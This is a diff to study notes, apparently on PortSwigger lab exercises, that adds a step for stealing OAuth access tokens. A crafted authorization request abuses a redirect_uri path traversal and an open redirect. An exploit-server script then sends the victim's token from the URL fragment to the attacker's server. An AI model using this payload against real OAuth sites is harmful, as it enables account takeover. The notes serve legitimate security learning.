@@ -155,7 +155,17 @@ These will often return a JSOn configuration flie containing key information, su
 ```
 GET /auth?client_id=wkif167dcko8iakmxn21i&redirect_uri=https://0af4009d0438773186de718100830085.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-0a1e0069049a775986497016018d00a6.exploit-server.net/exploit&response_type=token&nonce=-1325804996&scope=openid%20profile%20email
 ```
-
+- Now we need to generate an exploit on the exploit server
+```
+  <script>
+    if (!window.location.hash) {
+        window.location="https://oauth-0a1400e204039a12803a83d6023900d2.oauth-server.net/auth?client_id=pbouyvzg203c2mat5s09c&redirect_uri=https://0aa6009c04be9ac2803a85f9001900bc.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-0a76001f04049a8e804c84a90183009d.exploit-server.net/exploit&response_type=token&nonce=845611160&scope=openid%20profile%20email"
+    }
+    else {
+        window.location = "/?" + document.location.hash.substr(1)
+    }
+</script>
+```
 
 #### OpenID Connect
 - OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sits on top of the basic OAuth implementation. 
